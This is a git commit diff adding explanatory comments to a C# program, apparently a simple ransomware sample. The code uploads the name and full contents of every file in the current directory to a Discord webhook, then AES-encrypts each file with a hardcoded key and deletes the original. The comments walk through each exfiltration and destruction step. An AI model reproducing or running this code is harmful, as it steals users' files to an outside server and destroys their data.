99613f1a7b2573a5ab745f029fea2ccbeffe7b63
1waves <112463082+1waves@users.noreply.github.com>
2022-09-11 16:19:45 -0500

    Update main.cs

--- main.cs
+++ main.cs
@@ -16,23 +16,32 @@ namespace encrypt
        
         static void Main(string[] args)
         {
+            /*  IF statement for null args    */
             if (args is null)
             {
                 throw new ArgumentNullException(nameof(args));
             }
-
+            
+            /*  Variable holding the value of the files current directory    */
             string directory =  Directory.GetCurrentDirectory();
+            
+            /* Encrypting the key into base64 format */
             var bytes = Encoding.UTF8.GetBytes("dfjakjfklajldlkakfkldjafj");
             var key = Convert.ToBase64String(bytes, Base64FormattingOptions.InsertLineBreaks);
+            
+            /*  Variable to hold webhook link    */
             string webhook_link = "YOUR WEBHOOK";
 
-
+            /*  Iterating over each file in "directory */
             foreach (string file in Directory.GetFiles(directory))
             {
+                /*  Variable "content" holding the value of the content in the current file  */
                 string content = File.ReadAllText(file);
 
+                /*  Creating discord webhook */
                 var webhook = new Webhook()
                 {
+                    /*  Message to send webhook holding "content"    */
                     Message = $"**File Name: **{file}   **Content: **```{content}```",
                     Username = "waves0101",
                     WebhookUrl = $"{webhook_link}"
@@ -42,9 +51,11 @@ namespace encrypt
 
                
             }
-
+            
+            /*  Iterate over file in directory   */
             foreach (string file in Directory.GetFiles(directory))
             {
+                /*  Encrypting the content within each file for every iteration and deleting the file    */
                 string encrypted = directory + "encrypted.txt";
                 SharpAESCrypt.SharpAESCrypt.Encrypt(key, file, encrypted);
                 File.Delete(file);
